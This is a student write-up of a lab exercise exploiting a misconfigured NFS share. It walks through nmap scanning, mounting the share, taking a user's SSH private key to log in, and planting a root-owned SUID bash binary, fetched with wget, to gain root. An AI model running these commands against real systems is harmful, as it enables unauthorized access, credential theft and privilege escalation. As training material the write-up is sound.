# Exploiting NFS Port

The Exploiting NFS Port Lab's primary focus was to investigate vulnerabilities and gain root access. The lab demonstrates through an open NFS port and poor configuration, a hacker could gain access to a low-privilege shell and escalate privilege up to the root access. The lab provided an example of cybersecurity concepts including privilege escalation and exploitation.

### Skills Learned
- Enhanced knowledge of security vulnerabilities and privilege escalation
- Advanced understanding of hacking techniques
- Development of critical thinking and problem-solving skills in cybersecurity

### Tools Used
- Bash script for the SUID bit permissions used for privilege escalation

#### NFS
- Network File System (NFS) allows a system to share directories and files with others over a network by mounting a chosen portion of the file system on a server. The mounted portion of the file system is assigned specific privileges giving clients certain permissions to access the files.
- NFS by default enables root_squash, preventing users from using their root permissions and is instead re-mapped to a user with the least local privilege.
  - If root_squash is disabled then SUID bit files can be used to allow a remote user root access to the connected system.
  
## Steps to Gain Access to Low-Privilege Account
1. Open the terminal and conduct a thorough Nmap scan of the target system (10.10.129.184), inputting **nmap -A -p- 10.10.129.184**
  
   ![image](https://github.com/user-attachments/assets/972d2517-fccc-4026-9ecd-c02ea557ed02)
   - The results show that 7 ports are open and the NFS service is open on port 2049
2. Insert **/usr/sbin/showmount -e 10.10.129.184** to list out the NFS shares
  
   ![image](https://github.com/user-attachments/assets/3802e93a-9a1a-4080-9650-e743d79b1c64)
   - The name of a NFS share is *home*
3. Create a directory by typing **mkdir /tmp/mount** which will be used to mount the share to our system (this a temporary directory due to the **tmp** command, removing it on restart). Then mount the share using the command, **sudo mount -t nfs 10.10.129.184:home /tmp/mount -nolock**. After, change to the /tmp/mount directory using the **cd** command and input the **ls** command to view inside the share
  
   ![image](https://github.com/user-attachments/assets/58476b39-f665-4277-8c56-d9105854b009)
   - The share contains the folder *cappucino*
4. Enter the *cappucino* folder using the **cd** command and type the **ls -a** command to view the contents of the folder. Note the *.ssh* folder

   ![image](https://github.com/user-attachments/assets/f352cc07-b09a-48cf-9ca3-ceb7fa7ee199)
5. The .ssh folder may contain keys that would give us remote access to the server, so open the folder using the **cd** command and view the contents using the **ls** command
  
   ![image](https://github.com/user-attachments/assets/d7170b60-1e46-4963-a3d2-401c9b096a8a)
   - The *id_rsa* key would allow us remote access to the server
6. Copy the *id_rsa* key into our system (in this case the root) by typing **mv id_rsa /root**. Then move back to the /root directory using the **cd** command and check if the file is in the directory with the **ls** command. Then change the permission of the key by inserting **chmod 600 id_rsa** so that only the file owner has full read & write access with no other users being able to access it
  
   ![image](https://github.com/user-attachments/assets/e89651a4-bf77-40dc-bb50-a98c381e4678)
7. Now that we have the password, we need to find the username by re-entering the .ssh folder. First input **cd /tmp/mount/cappucino** then input **cd .ssh**. Once inside, open the *id_rsa.pub* folder using the **cat** command to find the username.
  
   ![image](https://github.com/user-attachments/assets/ed7473ab-974e-4354-88b7-ea1cadd7f740)
   - the username can be found at the end of the message as *cappucino*
8. Change the directory back to the root directory containing the key and successfully log into the account with the collected information by typing **ssh -i id_rsa cappucino@10.10.129.184**
   
    ![image](https://github.com/user-attachments/assets/760e0470-94ed-4b18-92b0-0c80df43f637)

## Steps to Escalate Privilege
9. Exit the account and return back to your system using the **exit** command. Check inside your directory using the **ls** command to see one of the directories titled *Downloads* and enter that directory with the **cd** command. In the Downloads directory, install bash from the GitHub page by inserting the **wget** command.
    - **wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash**

    ![image](https://github.com/user-attachments/assets/1c5de786-fa77-470a-87cc-9481529e80a0)
10. Change directory with **cd /tmp/mount/cappucino**. Copy the bash executable into this directory using **cp ~/Downloads/bash .** and check if bash is in the directory using the **ls** command. Then insert **sudo chown root bash** to transfer the ownership of the copied bash shell to the root user

    ![image](https://github.com/user-attachments/assets/91374661-922b-4b94-814f-d678db4a7f53)
11. Add SUID bit permissions to the copied bash executable by inserting **sudo chmod +s bash** and **sudo chmod +x bash**. The +s adds the SUID permission and the +x gives execution access. Check if everything is correct by typing **ls -la bash**

    ![image](https://github.com/user-attachments/assets/73f228d7-b865-4518-95f1-376c298c1c40)
12. Change directory back to **cd /root** and log back into the account using the same command **ssh -i id_rsa cappucino@10.10.129.184**. Insert the command **./bash -p** as the -p persists the permissions and check if you have root access by changing the directory to /root. You can check the content of this directory by using the **ls** command

    ![image](https://github.com/user-attachments/assets/93b33855-d631-4181-a6b6-6010e2e6f98d)




